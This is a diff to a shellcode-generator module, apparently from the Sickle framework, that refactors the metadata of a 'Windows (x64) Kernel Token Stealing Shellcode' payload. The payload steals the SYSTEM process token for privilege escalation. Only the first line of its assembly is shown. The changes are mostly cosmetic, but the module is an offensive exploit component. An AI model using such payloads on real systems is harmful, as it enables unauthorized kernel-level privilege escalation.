@@ -8,35 +8,36 @@ from sickle.common.lib.generic.mparser import argument_check
 
 class Shellcode():
 
-    name = "Windows (x64) Kernel Token Stealing Shellcode"
+    arch = 'x64'
+
+    platform = "windows"
+
+    name = f"Windows ({arch}) Kernel Token Stealing Shellcode"
     
-    module = "windows/x64/kernel_token_stealer"
+    module = f"{platform}/{arch}/kernel_token_stealer"
     
     example_run = f"{sys.argv[0]} -p {module} -f c"
     
-    platform = "Windows"
-    
-    arch = 'x64'
-    
     ring = 0
     
-    author = ["Mark Dowd", "Barnaby Jack", "wetw0rk"]
+    author = ["Mark Dowd",
+              "Barnaby Jack",
+              "wetw0rk"]
     
-    tested_platforms = ["Windows 11", "Windows 10"]
+    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]
 
-    summary = "Kernel token stealing shellcode (Windows x64)"
+    summary = "Kernel token stealing shellcode"
 
     description = """
     Hijacks a security token of another process (specifically NT/AUTHORITY SYSTEM),
-    allowing for elevation of privledges. Due to the nature of kernel exploitation
-    this shellcode DOES NOT contain instructions for returning to userland. You've
-    been warned...
+    allowing for elevation of privileges.
+
+    WARNING: ASSUME KERNEL SHELLCODE DOES NOT HANDLE RETURN TO USERLAND!!
     """
 
     arguments = None
 
     def __init__(self, arg_object):
-
 
         self.arg_list = arg_object["positional arguments"]
         self.builder = Assembler(Shellcode.arch)
@@ -44,6 +45,9 @@ class Shellcode():
         return
 
     def generate_source(self):
+        """Generates source code to be assembled by the keystone engine
+        """
+
         shellcode = """
         _start:
             mov rax, qword ptr gs:[0x188] ; Obtain the current thread ( nt!_KPCR.PcrbData.CurrentThread )
@@ -67,6 +71,3 @@ class Shellcode():
         """
 
         return self.builder.get_bytes_from_asm(self.generate_source())
-
-def generate():
-    return Shellcode().get_shellcode()
